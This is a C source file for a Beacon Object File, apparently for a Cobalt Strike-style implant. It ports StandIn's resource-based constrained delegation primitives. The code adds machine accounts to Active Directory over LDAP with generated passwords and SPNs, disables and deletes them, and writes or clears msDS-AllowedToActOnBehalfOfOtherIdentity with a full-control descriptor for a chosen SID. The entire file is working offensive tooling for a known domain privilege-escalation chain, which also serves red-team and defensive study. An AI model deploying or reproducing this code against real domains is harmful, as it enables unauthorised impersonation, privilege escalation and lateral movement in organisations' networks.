#include <windows.h>
#include <winldap.h>
#include <winber.h>
#include <sddl.h>
#include <dsgetdc.h>
#include "beacon.h"
#include "bofdefs.h"

/*
 * StandIn BOF — Resource-Based Constrained Delegation (RBCD) primitives,
 * ported 1:1 from FuzzySecurity/StandIn (v1.4). Focused on the machine-account
 * operations:
 *
 *   make    : LDAP Add a computer object (objectClass=Computer, sAMAccountName,
 *             userAccountControl=4096, dnsHostName, SPNs, unicodePwd)
 *   disable : userAccountControl |= ACCOUNTDISABLE (0x2)
 *   delete  : subtree-delete the computer object
 *   sid     : write msDS-AllowedToActOnBehalfOfOtherIdentity
 *   remove  : clear msDS-AllowedToActOnBehalfOfOtherIdentity
 *
 * Modes are dispatched from go() via an int; all five take --computer and the
 * optional --domain/--user/--pass alternate-credential set.
 */

/* ---- buffered output (one BeaconOutput per operation) ---- */
#define OUTBUFSIZE 16384
static char* g_out    = (char*)1;
static int   g_outLen = 1;

static void bflush(void)
{
    if (g_out != NULL && g_out != (char*)1 && g_outLen > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_out, g_outLen);
    g_outLen = 0;
    if (g_out != NULL && g_out != (char*)1)
        g_out[0] = '\0';
}

static void bprintf(const char* fmt, ...)
{
    va_list ap;
    int n, space;

    if (g_out == NULL || g_out == (char*)1) return;

    space = OUTBUFSIZE - g_outLen;
    if (space <= 1) { bflush(); space = OUTBUFSIZE; }

    va_start(ap, fmt);
    n = MSVCRT$vsnprintf(g_out + g_outLen, (size_t)space, fmt, ap);
    va_end(ap);

    /* vsnprintf returns -1 (old msvcrt) or >= space (C99) on truncation. */
    if (n < 0 || n >= space) {
        bflush();
        va_start(ap, fmt);
        n = MSVCRT$vsnprintf(g_out, OUTBUFSIZE, fmt, ap);
        va_end(ap);
        if (n < 0 || n >= OUTBUFSIZE) {
            g_outLen = OUTBUFSIZE - 1;
            g_out[g_outLen] = '\0';
            return;
        }
        g_outLen = n;
        return;
    }

    g_outLen += n;
}

/* ---- mode ids ---- */
#define MODE_MAKE    0
#define MODE_DISABLE 1
#define MODE_DELETE  2
#define MODE_SID     3
#define MODE_REMOVE  4

#ifndef LDAP_CONTROL_TREE_DELETE_OID
#define LDAP_CONTROL_TREE_DELETE_OID "1.2.840.113556.1.4.805"
#endif

static int  strtol_ascii(const char* s);
static void strcat_safe(char* dst, size_t dstSz, const char* src);

/* ---- domain context ---- */
static char g_dc[256];       /* DC hostname (no \\ prefix)   */
static char g_realm[256];    /* DNS realm, UPPERCASE         */
static char g_base[512];     /* defaultNamingContext         */
static LDAP* g_ld = NULL;

/* Resolve a domain controller + realm. domain may be NULL (current domain). */
static BOOL ResolveDomain(const char* domain)
{
    PDOMAIN_CONTROLLER_INFOA pdc = NULL;
    int i;

    g_dc[0]    = '\0';
    g_realm[0] = '\0';

    if (NETAPI32$DsGetDcNameA(NULL, domain, NULL, NULL, 0, &pdc) != ERROR_SUCCESS || !pdc)
        return FALSE;

    {
        const char* name = pdc->DomainControllerName;
        if (name && name[0] == '\\' && name[1] == '\\') name += 2;
        for (i = 0; name && name[i] && i < (int)sizeof(g_dc) - 1; i++) g_dc[i] = name[i];
        g_dc[i] = '\0';
    }

    {
        const char* dn = pdc->DomainName;   /* DNS name, e.g. redhook.local */
        for (i = 0; dn && dn[i] && i < (int)sizeof(g_realm) - 1; i++) {
            char c = dn[i];
            if (c >= 'a' && c <= 'z') c = c - 'a' + 'A';
            g_realm[i] = c;
        }
        g_realm[i] = '\0';
    }

    NETAPI32$NetApiBufferFree(pdc);
    return (g_dc[0] != '\0' && g_realm[0] != '\0');
}

/* Bind and enable signing+sealing (needed to write unicodePwd). */
static BOOL LdapConnect(const char* domain, const char* user, const char* pass, BOOL secure)
{
    ULONG rc;
    int   v = LDAP_VERSION3;
    char  bindDn[512];

    g_ld = secure
        ? WLDAP32$ldap_sslinit(g_dc, 636, 1)
        : WLDAP32$ldap_init(g_dc, 389);
    if (!g_ld) return FALSE;

    if (WLDAP32$ldap_set_option(g_ld, LDAP_OPT_PROTOCOL_VERSION, &v) != LDAP_SUCCESS)
        return FALSE;

    /* Enable LDAP signing + sealing on the SSPI session. Required for
     * unicodePwd; harmless for the read/modify/delete ops. */
    {
        PVOID on = LDAP_OPT_ON;
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_SIGN,    &on);
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_ENCRYPT, &on);
    }

    if (user && user[0] && pass && pass[0]) {
        /* Alternate creds. domain\user (NetBIOS) matches StandIn's
         * NetworkCredential semantics. */
        if (domain && domain[0])
            MSVCRT$sprintf(bindDn, "%s\\%s", domain, user);
        else
            MSVCRT$sprintf(bindDn, "%s@%s", user, g_realm);
        rc = WLDAP32$ldap_bind_s(g_ld, bindDn, pass, LDAP_AUTH_NEGOTIATE);
    } else {
        rc = WLDAP32$ldap_bind_s(g_ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    }

    if (rc != LDAP_SUCCESS) {
        bprintf("[!] LDAP bind failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        return FALSE;
    }

    return TRUE;
}

static void LdapDisconnect(void)
{
    if (g_ld) {
        WLDAP32$ldap_unbind_s(g_ld);
        g_ld = NULL;
    }
}

/* Read defaultNamingContext from rootDSE. */
static BOOL GetBaseDn(void)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR* vals      = NULL;
    PCHAR  attrs[]   = { "defaultNamingContext", NULL };
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, "", LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return FALSE;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        vals = WLDAP32$ldap_get_values(g_ld, e, "defaultNamingContext");
        if (vals && vals[0]) {
            int i = 0;
            for (; vals[0][i] && i < (int)sizeof(g_base) - 1; i++) g_base[i] = vals[0][i];
            g_base[i] = '\0';
        }
        if (vals) WLDAP32$ldap_value_free(vals);
    }

    WLDAP32$ldap_msgfree(res);
    return g_base[0] != '\0';
}

/* Find an object by sam filter; returns its DN (caller frees with ldap_memfree). */
static PCHAR FindObjectDn(const char* samFilter)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR  attrs[]   = { "distinguishedName", NULL };
    PCHAR  dn        = NULL;
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, g_base, LDAP_SCOPE_SUBTREE, samFilter, attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return NULL;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e)
        dn = WLDAP32$ldap_get_dn(g_ld, e);

    WLDAP32$ldap_msgfree(res);
    return dn;
}

static int ReadUac(const char* dn)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR* vals      = NULL;
    PCHAR  attrs[]   = { "userAccountControl", NULL };
    int    uac       = -1;
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return -1;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        vals = WLDAP32$ldap_get_values(g_ld, e, "userAccountControl");
        if (vals && vals[0]) uac = (int)strtol_ascii(vals[0]);
        if (vals) WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return uac;
}

/* tiny decimal string -> int (avoids a MSVCRT$strtol import) */
static int strtol_ascii(const char* s)
{
    int v = 0;
    while (*s >= '0' && *s <= '9') { v = v * 10 + (*s - '0'); s++; }
    return v;
}

/* ---- password generation (15-char [A-Za-z0-9]) ---- */
static void GenMachinePass(char* out, int len)
{
    static const char keyspace[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    unsigned char rnd[32];
    int i;
    ADVAPI32$SystemFunction036(rnd, sizeof(rnd));
    for (i = 0; i < len; i++)
        out[i] = keyspace[rnd[i % sizeof(rnd)] % (sizeof(keyspace) - 1)];
    out[len] = '\0';
}

/* ---- op: make machine account ---- */
static void OpMake(const char* computer)
{
    char pass[16];
    char dn[384];
    char dns[256];
    char spn1[256], spn2[256], spn3[256], spn4[256];
    char sam[128];
    char uac[16] = "4096";

    char    upwBytes[128];
    int     upwLen = 0;
    int     i;

    GenMachinePass(pass, 15);

    /* DN: CN=<name>,CN=Computers,DC=<realm parts> */
    {
        char* p = g_realm;
        MSVCRT$sprintf(dn, "CN=%s,CN=Computers", computer);
        /* realm is uppercase; split on '.' and append DC= parts */
        char tmp[256];
        int  ti = 0, ci;
        for (ci = 0; p[ci] != '\0'; ci++) {
            if (p[ci] == '.') {
                tmp[ti] = '\0';
                char part[64];
                MSVCRT$sprintf(part, ",DC=%s", tmp);
                strcat_safe(dn, sizeof(dn), part);
                ti = 0;
            } else {
                tmp[ti++] = p[ci];
            }
        }
        if (ti > 0) {
            tmp[ti] = '\0';
            char part[64];
            MSVCRT$sprintf(part, ",DC=%s", tmp);
            strcat_safe(dn, sizeof(dn), part);
        }
    }

    MSVCRT$sprintf(sam, "%s$", computer);
    MSVCRT$sprintf(dns, "%s.%s", computer, g_realm);
    MSVCRT$sprintf(spn1, "HOST/%s.%s", computer, g_realm);
    MSVCRT$sprintf(spn2, "RestrictedKrbHost/%s.%s", computer, g_realm);
    MSVCRT$sprintf(spn3, "HOST/%s", computer);
    MSVCRT$sprintf(spn4, "RestrictedKrbHost/%s", computer);

    /* unicodePwd = UTF-16LE of '"' + pass + '"' */
    {
        char q[64];
        MSVCRT$sprintf(q, "\"%s\"", pass);
        upwLen = MSVCRT$strlen(q) * 2;
        for (int j = 0; q[j]; j++) {
            upwBytes[j * 2]     = q[j];
            upwBytes[j * 2 + 1] = 0;
        }
    }

    bprintf("[?] Using DC   : %s\n", g_dc);
    bprintf("    |_ Domain  : %s\n", g_realm);
    bprintf("    |_ DN      : %s\n", dn);
    bprintf("    |_ Password: %s\n", pass);

    {
        char* ocVals[]  = { "Computer", NULL };
        char* samVals[] = { sam, NULL };
        char* uacVals[] = { uac, NULL };
        char* dnsVals[] = { dns, NULL };
        char* spnVals[] = { spn1, spn2, spn3, spn4, NULL };

        struct berval upwBv;
        struct berval* upwBvals[] = { &upwBv, NULL };
        upwBv.bv_len = (ULONG)upwLen;
        upwBv.bv_val = upwBytes;

        LDAPMod mods[7];
        LDAPMod* modArr[8];

        mods[0].mod_op = LDAP_MOD_ADD;
        mods[0].mod_type = "objectClass";
        mods[0].mod_vals.modv_strvals = ocVals;

        mods[1].mod_op = LDAP_MOD_ADD;
        mods[1].mod_type = "sAMAccountName";
        mods[1].mod_vals.modv_strvals = samVals;

        mods[2].mod_op = LDAP_MOD_ADD;
        mods[2].mod_type = "userAccountControl";
        mods[2].mod_vals.modv_strvals = uacVals;

        mods[3].mod_op = LDAP_MOD_ADD;
        mods[3].mod_type = "dNSHostName";
        mods[3].mod_vals.modv_strvals = dnsVals;

        mods[4].mod_op = LDAP_MOD_ADD;
        mods[4].mod_type = "servicePrincipalName";
        mods[4].mod_vals.modv_strvals = spnVals;

        mods[5].mod_op = LDAP_MOD_ADD | LDAP_MOD_BVALUES;
        mods[5].mod_type = "unicodePwd";
        mods[5].mod_vals.modv_bvals = upwBvals;

        for (i = 0; i < 6; i++) modArr[i] = &mods[i];
        modArr[6] = NULL;

        ULONG rc = WLDAP32$ldap_add_s(g_ld, dn, modArr);
        if (rc == LDAP_SUCCESS)
            bprintf("\n[+] Machine account added to AD..\n");
        else
            bprintf("\n[!] Failed to add machine account to AD (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }
}

/* ---- op: disable machine account ---- */
static void OpDisable(const char* computer)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    int uac = ReadUac(dn);
    if (uac < 0) { bprintf("[!] Failed to read userAccountControl..\n"); WLDAP32$ldap_memfree(dn); return; }

    if (!(uac & 0x2)) {
        char newUac[16];
        MSVCRT$sprintf(newUac, "%d", uac | 0x2);
        char* vals[] = { newUac, NULL };
        LDAPMod mod;
        LDAPMod* mods[2];
        mod.mod_op = LDAP_MOD_REPLACE;
        mod.mod_type = "userAccountControl";
        mod.mod_vals.modv_strvals = vals;
        mods[0] = &mod;
        mods[1] = NULL;

        bprintf("[+] Machine account currently enabled\n");
        ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
        if (rc == LDAP_SUCCESS)
            bprintf("    |_ Account disabled..\n");
        else
            bprintf("[!] Failed to disable machine account (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    } else {
        bprintf("[+] Machine account already disabled\n");
        bprintf("    |_ Exiting..\n");
    }

    WLDAP32$ldap_memfree(dn);
}

/* ---- op: delete machine account (tree delete) ---- */
static void OpDelete(const char* computer)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    struct berval bv = { 0, NULL };
    LDAPControl tc = { LDAP_CONTROL_TREE_DELETE_OID, bv, TRUE };
    PLDAPControl sctrls[] = { &tc, NULL };

    ULONG rc = WLDAP32$ldap_delete_ext_s(g_ld, dn, sctrls, NULL);
    if (rc == LDAP_SUCCESS)
        bprintf("[+] Machine account deleted from AD\n");
    else
        bprintf("[!] Failed to delete machine account (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));

    WLDAP32$ldap_memfree(dn);
}

/* ---- op: set msDS-AllowedToActOnBehalfOfOtherIdentity ---- */
static void OpSetRBCD(const char* computer, const char* sid)
{
    char filter[512];
    char sddl[1024];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    /* Build the SDDL: O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>) */
    MSVCRT$sprintf(sddl, "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;%s)", sid);

    wchar_t wsddl[1024];
    if (!toWideChar(sddl, wsddl, sizeof(wsddl))) {
        bprintf("[!] Failed to widen SDDL string..\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    PSECURITY_DESCRIPTOR pSD = NULL;
    ULONG sdLen = 0;
    if (!ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorW(wsddl, SDDL_REVISION_1, &pSD, &sdLen) || !pSD) {
        bprintf("[!] Failed to build security descriptor..\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    struct berval bv;
    struct berval* bvals[] = { &bv, NULL };
    bv.bv_len = sdLen;
    bv.bv_val = (PCHAR)pSD;

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op = LDAP_MOD_REPLACE;
    mod.mod_type = "msDS-AllowedToActOnBehalfOfOtherIdentity";
    mod.mod_vals.modv_bvals = bvals;
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_SUCCESS)
        bprintf("[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity\n");
    else
        bprintf("[!] Failed to set msDS-AllowedToActOnBehalfOfOtherIdentity (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));

    KERNEL32$LocalFree(pSD);
    WLDAP32$ldap_memfree(dn);
}

/* ---- op: remove msDS-AllowedToActOnBehalfOfOtherIdentity ---- */
static void OpRemoveRBCD(const char* computer)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op = LDAP_MOD_DELETE;
    mod.mod_type = "msDS-AllowedToActOnBehalfOfOtherIdentity";
    mod.mod_vals.modv_strvals = NULL;
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_SUCCESS)
        bprintf("[+] msDS-AllowedToActOnBehalfOfOtherIdentity property removed..\n");
    else
        bprintf("[!] Failed to remove msDS-AllowedToActOnBehalfOfOtherIdentity (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));

    WLDAP32$ldap_memfree(dn);
}

/* ---- safe strcat (no MSVCRT$strcat import) ---- */
static void strcat_safe(char* dst, size_t dstSz, const char* src)
{
    size_t d = 0;
    while (dst[d] && d < dstSz - 1) d++;
    size_t s = 0;
    while (src[s] && d < dstSz - 1) dst[d++] = src[s++];
    dst[d] = '\0';
}

/* ---- entry ---- */
void go(char* args, int len)
{
    datap parser;
    int   mode;
    char* computer = NULL;
    char* sid      = NULL;
    char* domain   = NULL;
    char* user     = NULL;
    char* pass     = NULL;

    g_out    = (char*)MSVCRT$calloc(OUTBUFSIZE, 1);
    g_outLen = 0;
    if (g_out) g_out[0] = '\0';

    BeaconDataParse(&parser, args, len);
    mode     = BeaconDataInt(&parser);
    computer = BeaconDataExtract(&parser, NULL);
    sid      = BeaconDataExtract(&parser, NULL);
    domain   = BeaconDataExtract(&parser, NULL);
    user     = BeaconDataExtract(&parser, NULL);
    pass     = BeaconDataExtract(&parser, NULL);

    if (!computer || computer[0] == '\0') {
        bprintf("[-] No computer name supplied\n");
        goto done;
    }

    if (mode == MODE_SID && (!sid || sid[0] == '\0')) {
        bprintf("[-] --sid requires a SID (e.g. S-1-5-21-...)\n");
        goto done;
    }

    if (!ResolveDomain((domain && domain[0]) ? domain : NULL)) {
        bprintf("[!] Could not resolve domain controller / realm\n");
        goto done;
    }

    if (!LdapConnect(domain, user, pass, FALSE)) {
        bprintf("[!] Failed to connect to LDAP (%s:389)\n", g_dc);
        goto done;
    }

    if (mode != MODE_MAKE) {
        if (!GetBaseDn()) {
            bprintf("[!] Failed to read defaultNamingContext\n");
            goto done;
        }
    }

    switch (mode) {
        case MODE_MAKE:    OpMake(computer);          break;
        case MODE_DISABLE: OpDisable(computer);       break;
        case MODE_DELETE:  OpDelete(computer);        break;
        case MODE_SID:     OpSetRBCD(computer, sid);  break;
        case MODE_REMOVE:  OpRemoveRBCD(computer);    break;
        default:           bprintf("[-] Unknown mode %d\n", mode); break;
    }

    LdapDisconnect();

done:
    bflush();
    if (g_out && g_out != (char*)1)
        MSVCRT$free(g_out);
    g_out    = (char*)1;
    g_outLen = 1;
}
